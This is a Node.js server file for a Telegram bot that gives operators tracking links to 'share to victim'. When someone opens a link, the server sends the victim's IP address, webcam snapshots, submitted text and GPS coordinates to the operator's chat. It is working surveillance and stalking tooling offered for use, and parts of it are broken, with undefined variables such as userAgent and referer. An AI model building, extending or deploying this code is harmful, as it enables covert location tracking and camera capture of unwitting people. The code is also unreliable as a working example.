import fs from 'fs';
import express from 'express';
import bodyParser from 'body-parser';
import config from './config.json' assert { type: "json" };
import TelegramBot from 'node-telegram-bot-api';
import DB from './db/db.js';
import cors from 'cors';

const HOSTURL = "http://localhost:3000";
const bot = new TelegramBot(config.token, { polling: true });
const app = express();
const port = 3000;
const jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });

app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");



const generateNewLink = (chatId) => {

    const id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    var response = HOSTURL + "/link/" + id;
    DB.insert("links", {
        id: id,
        link: response,
        chatId: chatId
    });
    bot.sendMessage(chatId, "Success! Your link is " + response + " , share your link to victim ");

}

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const username = msg.from.username;

    if (text == "/start") {
        bot.sendMessage(chatId, "Hello " + username + "!");
        bot.sendMessage(chatId, config.help_text);
    }
    else if (text == "/help") {
        bot.sendMessage(chatId, config.help_text);
    } else if (text == "/newlink") {
        generateNewLink(chatId);
    }
});
bot.on('polling_error', (error) => {
    console.log(error.code);  // => 'EFATAL'
});


app.get("/", (req, res) => {
    res.render("index", { id: req.query.id });
});

app.get("/link/:id", (req, res) => {
    const id = req.params.id;
    const linksdata = DB.find("links", id);
    const chatId = linksdata.chatId;

    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const time = new Date();

    var buildMessage = "New Victim!\n";
    buildMessage += "IP: " + userIP + "\n";
    buildMessage += "User Agent: " + userAgent + "\n";
    buildMessage += "Referer: " + referer + "\n";
    buildMessage += "Host: " + host + "\n";
    buildMessage += "Date: " + date + "\n";

    bot.sendMessage(chatId, buildMessage);
    bot.sendChatAction(chatId, "typing");
    res.render("webview", { id: id, host: HOSTURL, ip: userIP  , time: time});

});
app.post("/api/post", (req, res) => {
    const id = req.body.id;
    console.log(id)
    const linksdata = DB.find("links", id);
    const chatId = linksdata.chatId;
    const data = req.body.data;
    const type = req.body.type;
    if (type == 'image') {

        var img = decodeURIComponent(data) || null;

        if (img != null) {

            var buffer = Buffer.from(img, 'base64');
            var info = {
                filename: "camsnap.png",
                contentType: 'image/png'
            };


            try {
                var filename = DB.database_name + '/' + chatId + "_victim.png";
                if(fs.existsSync(filename)){
                    // date dmY
                    var date = new Date();
                    var dmY = date.getDate() + "" + (date.getMonth() + 1) + "" + date.getFullYear() + "" + date.getHours() + "" + date.getMinutes() + "" + date.getSeconds();
                    var filename = DB.database_name + '/' + chatId + "_victim_" + dmY + ".png";
                }
                fs.writeFileSync(filename, buffer, 'base64');
                DB.insert("logs", {
                    id: id,
                    chatId: chatId,
                    action: 'photo',
                    data: DB.database_name + '/' + chatId + "_victim.png",
                });
                bot.sendPhoto(chatId, buffer, {}, info);
            } catch (error) {
                console.log(error);
            }


            res.json({ status: "success" });
        }
    } else if (type == 'text') {
        var dt = decodeURIComponent(data);
        DB.insert("logs", {
            id: id,
            chatId: chatId,
            action: 'information',
            data: dt,
        });
     //   dt = dt.replaceAll(/</g, "&lt;").replace(/>/g, "&gt;");
        dt = dt.replaceAll("<br>","\n");
        bot.sendMessage(chatId,dt, {parse_mode : 'HTML'});
        res.json({ success:true});
    }

});
app.post("/api/loc", (req, res) => {

    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var acc = parseFloat(decodeURIComponent(req.body.acc)) || null;
    if (lon != null && lat != null ) {
        const id = req.body.id;
        console.log(id)
        const linksdata = DB.find("links", id);
        const chatId = linksdata.chatId;
        console.log(lat,lon);
        bot.sendLocation(chatId, lat, lon);

        bot.sendMessage(chatId, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
        res.json({success:true});
    }else{
        bot.sendMessage(chatId, `Can't get location`);
        res.json({success:false});
    }
    });
app.listen(port, () => {
    console.log(`Example app listening at http://localhost:${port}`)
});


